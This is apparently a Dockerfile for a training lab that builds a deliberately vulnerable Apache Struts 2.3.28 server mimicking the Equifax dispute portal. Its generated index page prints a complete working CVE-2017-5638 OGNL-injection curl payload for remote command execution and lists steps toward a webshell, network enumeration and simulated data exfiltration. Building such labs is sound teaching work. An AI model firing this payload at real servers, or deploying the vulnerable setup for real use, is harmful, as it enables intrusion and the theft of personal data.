# Vulnerable Apache Struts 2.3.28 - CVE-2017-5638
# FOR EDUCATIONAL PURPOSES ONLY - DO NOT EXPOSE TO INTERNET
FROM tomcat:8.5-jre8

LABEL maintainer="devsecops-lab"
LABEL description="Intentionally vulnerable Struts 2.3.28 for CVE-2017-5638 demonstration"
LABEL cve="CVE-2017-5638"
LABEL version="struts-2.3.28"

# Install dependencies
RUN apt-get update && apt-get install -y \
    wget \
    unzip \
    && rm -rf /var/lib/apt/lists/*

# Remove default Tomcat webapps
RUN rm -rf /usr/local/tomcat/webapps/*

# Download vulnerable Struts 2.3.28
WORKDIR /tmp
RUN wget https://archive.apache.org/dist/struts/2.3.28/struts-2.3.28-apps.zip && \
    unzip struts-2.3.28-apps.zip && \
    cp struts-2.3.28/apps/struts2-showcase.war /usr/local/tomcat/webapps/ && \
    rm -rf /tmp/*

# Create vulnerable upload endpoint (simulates Equifax ACIS portal)
WORKDIR /usr/local/tomcat/webapps/ROOT
RUN mkdir -p WEB-INF/classes META-INF

# Create minimal web.xml for upload functionality
RUN echo '<?xml version="1.0" encoding="UTF-8"?>\n\
<web-app xmlns="http://java.sun.com/xml/ns/javaee"\n\
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n\
         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee\n\
         http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"\n\
         version="3.0">\n\
    <display-name>ACIS Dispute Portal</display-name>\n\
    <filter>\n\
        <filter-name>struts2</filter-name>\n\
        <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>\n\
    </filter>\n\
    <filter-mapping>\n\
        <filter-name>struts2</filter-name>\n\
        <url-pattern>/*</url-pattern>\n\
    </filter-mapping>\n\
    <welcome-file-list>\n\
        <welcome-file>index.jsp</welcome-file>\n\
    </welcome-file-list>\n\
</web-app>' > WEB-INF/web.xml

# Create struts.xml configuration
RUN echo '<?xml version="1.0" encoding="UTF-8"?>\n\
<!DOCTYPE struts PUBLIC\n\
    "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"\n\
    "http://struts.apache.org/dtds/struts-2.3.dtd">\n\
<struts>\n\
    <constant name="struts.devMode" value="false" />\n\
    <constant name="struts.multipart.maxSize" value="10000000" />\n\
    <package name="default" extends="struts-default">\n\
        <action name="upload" class="org.apache.struts2.showcase.fileupload.FileUploadAction">\n\
            <result name="success">/WEB-INF/upload/success.jsp</result>\n\
            <result name="input">/WEB-INF/upload/upload.jsp</result>\n\
        </action>\n\
    </package>\n\
</struts>' > WEB-INF/classes/struts.xml

# Create index page (simulates Equifax portal)
RUN echo '<!DOCTYPE html>\n\
<html>\n\
<head>\n\
    <title>ACIS Dispute Portal - Equifax</title>\n\
    <style>\n\
        body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 40px; }\n\
        .container { background: white; padding: 30px; border-radius: 8px; max-width: 800px; margin: 0 auto; }\n\
        h1 { color: #c8102e; }\n\
        .warning { background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 4px; margin: 20px 0; }\n\
        .info { background: #d1ecf1; border: 1px solid #0c5460; padding: 15px; border-radius: 4px; margin: 20px 0; }\n\
        code { background: #f8f9fa; padding: 2px 6px; border-radius: 3px; font-family: monospace; }\n\
    </style>\n\
</head>\n\
<body>\n\
    <div class="container">\n\
        <h1>Automated Consumer Interview System (ACIS)</h1>\n\
        <p>Equifax Consumer Dispute Portal</p>\n\
        \n\
        <div class="warning">\n\
            <strong>⚠️ EDUCATIONAL ENVIRONMENT</strong><br>\n\
            This is a recreation of the vulnerable Equifax ACIS portal for TIME BREACH mission.<br>\n\
            Running Apache Struts <strong>2.3.28</strong> - Vulnerable to <strong>CVE-2017-5638</strong>\n\
        </div>\n\
        \n\
        <div class="info">\n\
            <strong>Vulnerability Details:</strong><br>\n\
            <ul>\n\
                <li><strong>CVE:</strong> CVE-2017-5638</li>\n\
                <li><strong>Type:</strong> Remote Code Execution via OGNL Injection</li>\n\
                <li><strong>Vector:</strong> Malicious Content-Type header in file upload</li>\n\
                <li><strong>Severity:</strong> CRITICAL (CVSS 10.0)</li>\n\
            </ul>\n\
        </div>\n\
        \n\
        <h2>Exploitation Endpoint</h2>\n\
        <p>Upload endpoint (vulnerable): <code>/upload.action</code></p>\n\
        \n\
        <h2>Test Payload</h2>\n\
        <p>Send POST request with malicious Content-Type header:</p>\n\
        <pre style="background: #f8f9fa; padding: 15px; overflow-x: auto;">\n\
curl -X POST http://localhost:8003/upload.action \\\n\
  -H "Content-Type: %{(#_='"'"'multipart/form-data'"'"').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['"'"'com.opensymphony.xwork2.ActionContext.container'"'"']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"'"'id'"'"').(#iswin=(@java.lang.System@getProperty('"'"'os.name'"'"').toLowerCase().contains('"'"'win'"'"'))).(#cmds=(#iswin?{'"'"'cmd.exe'"'"','"'"'/c'"'"',#cmd}:{'"'"'/bin/bash'"'"','"'"'-c'"'"',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \\\n\
  -F "upload=@test.txt"\n\
        </pre>\n\
        \n\
        <h2>Mission Objectives</h2>\n\
        <ol>\n\
            <li>Exploit CVE-2017-5638 to gain remote code execution</li>\n\
            <li>Upload webshell for persistence</li>\n\
            <li>Enumerate internal network</li>\n\
            <li>Locate database servers</li>\n\
            <li>Exfiltrate consumer data (simulated)</li>\n\
        </ol>\n\
        \n\
        <p style="margin-top: 30px; color: #666; font-size: 0.9em;">\n\
            Server Version: Apache Struts 2.3.28 | Tomcat 8.5 | Java 8<br>\n\
            Last Updated: March 2017 (Patch Available - Not Applied)\n\
        </p>\n\
    </div>\n\
</body>\n\
</html>' > index.jsp

# Copy Struts libraries to webapp
RUN cd /tmp && \
    wget https://archive.apache.org/dist/struts/2.3.28/struts-2.3.28-lib.zip && \
    unzip struts-2.3.28-lib.zip && \
    cp struts-2.3.28/lib/*.jar /usr/local/tomcat/webapps/ROOT/WEB-INF/lib/ 2>/dev/null || true && \
    rm -rf /tmp/*

# Expose port
EXPOSE 8080

# Health check
HEALTHCHECK --interval=30s --timeout=5s --start-period=40s --retries=3 \
    CMD curl -f http://localhost:8080/ || exit 1

# Run Tomcat
CMD ["catalina.sh", "run"]
